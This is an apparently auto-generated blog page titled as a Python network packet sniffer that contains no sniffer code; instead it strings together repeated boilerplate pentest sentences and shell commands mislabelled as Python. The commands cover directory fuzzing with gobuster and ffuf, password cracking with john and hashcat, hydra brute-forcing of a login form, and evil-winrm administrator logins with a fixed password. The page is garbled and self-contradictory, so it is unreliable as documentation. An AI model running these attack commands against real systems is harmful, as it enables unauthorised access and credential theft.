---
TitleSEO: "Network Packet Sniffer in Python | ZureFX"
TitlePost: "Network Packet Sniffer — Python"
Author: "ZureFX"
Description: "A Python script for network packet sniffer. Built for security research and automation."
Keywords: "script, go, python, tool, bash"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-197.html"
URL_IMAGES: ""
Date: "2025-03-04"
Tags: "Script, Go, Python, Tool, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-197"
Permalink: "/scripting/script-network-packet-sniffer-197.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `wmiexec`
- `msfvenom`
- `nikto`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

```python
gobuster dir -u http://10.91.35.203/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Helper Functions

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

```python
evil-winrm -i 10.118.158.144 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.49.176.50 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.207.18/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.44.12.110 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.107.71.183/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.26.119.190 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 29.65s
```
